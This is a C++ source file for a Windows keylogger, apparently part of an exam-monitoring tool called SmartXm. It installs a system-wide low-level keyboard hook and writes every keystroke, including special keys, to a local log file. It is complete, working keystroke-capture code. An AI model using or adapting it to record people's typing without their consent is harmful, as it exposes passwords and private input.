/**
 * @file keylogger.cpp
 * @brief Implementation of the KeyLogger class for capturing and logging keyboard input.
 * 
 * This file contains the implementation of a Windows keylogger that captures
 * keyboard events using low-level keyboard hooks and logs them to a file.
 * The keylogger is designed for exam monitoring and security purposes.
 * 
 * @author SmartXm Development Team
 * @date 2025
 * @version 1.0
 * 
 * @warning This keylogger should only be used for legitimate purposes such as
 * exam monitoring with proper user consent and in accordance with applicable laws.
 */

#include "keylogger.h"

/// @brief Global KeyLogger instance used by the keyboard hook callback
KeyLogger keylogger;

/**
 * @brief Starts logging keystrokes to a file.
 * @param filename Name of the file to write keystrokes to
 * @return true if logging started successfully, false otherwise
 *
 * Opens the specified file in overwrite mode (ios::out | ios::trunc),
 * writes a timestamped "Keylogger Started" header, and sets the internal
 * logging flag to true. If the file cannot be opened, logging remains disabled.
 * 
 * @note The file is opened in truncation mode, so any existing content will be lost.
 * @see stopLogging()
 */
bool KeyLogger::startLogging(const string &filename)
{
    keyStrokes.open(filename, ios::out | ios::trunc);
    
    if (!keyStrokes.is_open()) {
        return false;
    }

    isLogging = true;

    keyStrokes << "=== Keylogger Started at: " << getCurrentTime() << "===\n";

    return true;
}

/**
 * @brief Stops logging and closes the log file.
 *
 * Writes a timestamped "Keylogger Stopped" footer to the log file,
 * closes the file stream, and sets the logging flag to false.
 * If logging is not currently active, this function has no effect.
 * 
 * @note This function is safe to call even when logging is not active.
 * @see startLogging()
 */
void KeyLogger::stopLogging()
{
    if (isLogging) {
        keyStrokes << "\n=== Keylogger Stopped at: " << getCurrentTime() << " ===\n";

        keyStrokes.close();

        isLogging = false;
    }
}

/**
 * @brief Logs a single key press event.
 * @param key Virtual-key code of the pressed key (Windows VK_* constants)
 *
 * Converts and logs the key press based on its type:
 * - Printable ASCII characters (32-126): logged as-is
 * - Special keys (Enter, Backspace, etc.): logged with descriptive names in brackets
 * - Other keys: logged as [KEY:code] format
 * 
 * The output is immediately flushed to ensure real-time logging.
 * If logging is not active, this function returns immediately without action.
 * 
 * @note Supported special keys include:
 *       - VK_RETURN: [newline]
 *       - VK_BACK: [BACKSPACE]
 *       - VK_DELETE: [DELETE]
 *       - VK_TAB: [TAB]
 *       - VK_ESCAPE: [ESC]
 *       - VK_CONTROL: [CTRL]
 *       - Arrow keys: [LEFT], [RIGHT], [UP], [DOWN]
 * 
 * @see isLogging
 */
void KeyLogger::logKey(int key)
{
    if (!isLogging) {
        return;
    }

    if (key >= 32 && key <= 126) {
        keyStrokes << (char) key;
    }
    else {
        switch (key)
        {
        case VK_RETURN:
            keyStrokes << "\n";
            break;
        case VK_BACK:
            keyStrokes << "[BACKSPACE]";
            break;
        case VK_DELETE:
            keyStrokes << "[DELETE]";
            break;
        case VK_TAB:
            keyStrokes << "[TAB]";
            break;
        case VK_ESCAPE:
            keyStrokes << "[ESC]";
            break;
        case VK_CONTROL:
            keyStrokes << "[CTRL]";
            break;
        case VK_LCONTROL:
            keyStrokes << "[LCTRL]";
            break;
        case VK_RCONTROL:
            keyStrokes << "[RCTRL]";
            break;
        case VK_LSHIFT:
            keyStrokes << "[LSHIFT]";
            break;
        case VK_RSHIFT:
            keyStrokes << "[RSHIFT]";
            break;
        case VK_LWIN:
            keyStrokes << "[LWIN]";
            break;
        case VK_RWIN:
            keyStrokes << "[RWIN]";
            break;
        case VK_MENU:
            keyStrokes << "[ALT]";
            break;
        case VK_LMENU:
            keyStrokes << "[LALT]";
            break;
        case VK_RMENU:
            keyStrokes << "[RALT]";
            break;
        case VK_LEFT:
            keyStrokes << "[LEFT]";
            break;
        case VK_RIGHT:
            keyStrokes << "[RIGHT]";
            break;
        case VK_UP:
            keyStrokes << "[UP]";
            break;
        case VK_DOWN:
            keyStrokes << "[DOWN]";
            break;

        default:
            keyStrokes << "[KEY:" << key << "]";
            break;
        }
    }

    keyStrokes.flush();
}

/**
 * @brief Gets the current system time as a human-readable string.
 * @return Current time formatted as a string (e.g., "Wed Aug 28 12:34:56 2025")
 * 
 * Uses the standard C time functions to get the current system time
 * and formats it using ctime(). The trailing newline character from
 * ctime() is removed for cleaner logging output.
 * 
 * @note The returned string format is platform-dependent but typically
 *       follows the format "Day Mon DD HH:MM:SS YYYY"
 */
string KeyLogger::getCurrentTime()
{
    time_t now = time(0);

    char *timeStr = ctime(&now);

    string currentTime(timeStr);

    currentTime.pop_back();

    return currentTime;
}

/**
 * @brief Callback function for low-level keyboard events.
 * @param nCode Hook code indicating how to process the message
 * @param wParam Type of keyboard message (WM_KEYDOWN, WM_KEYUP, etc.)
 * @param lParam Pointer to KBDLLHOOKSTRUCT containing key information
 * @return LRESULT value that should be returned by CallNextHookEx()
 *
 * This function is called by the Windows hook mechanism whenever a keyboard
 * event occurs system-wide. It filters for WM_KEYDOWN events and logs the
 * corresponding key presses using the global keylogger instance.
 * 
 * @note This function must be declared with CALLBACK calling convention
 *       to work properly with the Windows hook system.
 * 
 * @warning This function is called from the Windows message loop and should
 *          perform minimal processing to avoid system performance issues.
 * 
 * @see SetWindowsHookEx(), KBDLLHOOKSTRUCT, KeyLogger::logKey()
 */
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    if (nCode >= 0 && wParam == WM_KEYDOWN) {
        KBDLLHOOKSTRUCT *pKeyBoard = (KBDLLHOOKSTRUCT *) lParam;

        keylogger.logKey(pKeyBoard->vkCode);
    }

    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

/**
 * @brief Entry point of the keylogger application.
 * @param argc Number of command-line arguments
 * @param argv Array of command-line argument strings
 * @return Exit status code (0 for success, 1 for failure)
 *
 * This function implements the main keylogger workflow:
 * 1. Saves the current thread ID to a file for external process control
 * 2. Determines the log file name from command line or uses default
 * 3. Starts the keylogger with the specified log file
 * 4. Installs a low-level keyboard hook using Windows API
 * 5. Runs a message loop waiting for WM_STOP or other messages
 * 6. Cleans up the hook and stops logging on exit
 * 
 * @param argc If argc > 1, argv[1] is used as the log filename
 * @param argv Command line arguments array
 * 
 * @note The thread ID is saved to "ThreadId/keyloggerThread.id" to allow
 *       external processes to send termination messages.
 * 
 * @note Default log file is "Logs/keyStrokes.log" if no argument provided.
 * 
 * @warning This application requires administrator privileges on Windows
 *          to install system-wide keyboard hooks.
 * 
 * @see SetWindowsHookEx(), KeyboardProc(), KeyLogger::startLogging()
 */
int main(int argc, char *argv[])
{
    DWORD keyloggerThreadId = GetCurrentThreadId();

    ofstream("ThreadId/keyloggerThread.id") << keyloggerThreadId;

    string logFileName = (argc > 1) ? argv[1] : "Logs/keyStrokes.log";

    if (!keylogger.startLogging(logFileName)) {
        MessageBoxA(NULL, "Failed to start logging", "Keylogger Failed", MB_ICONERROR | MB_OK);

        return 1;
    }

    HHOOK hook = SetWindowsHookEx(
        WH_KEYBOARD_LL, KeyboardProc,
        GetModuleHandle(NULL), 0);

    if (!hook) {
        MessageBoxA(NULL, "Failed to install hook", "Keylogger Failed", MB_ICONERROR | MB_OK);

        return 1;
    }

    MSG msg;

    while (GetMessage(&msg, NULL, 0, 0)) {
        if (msg.message == WM_STOP) {
            break;
        }

        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    UnhookWindowsHookEx(hook);
    keylogger.stopLogging();

    return 0;
}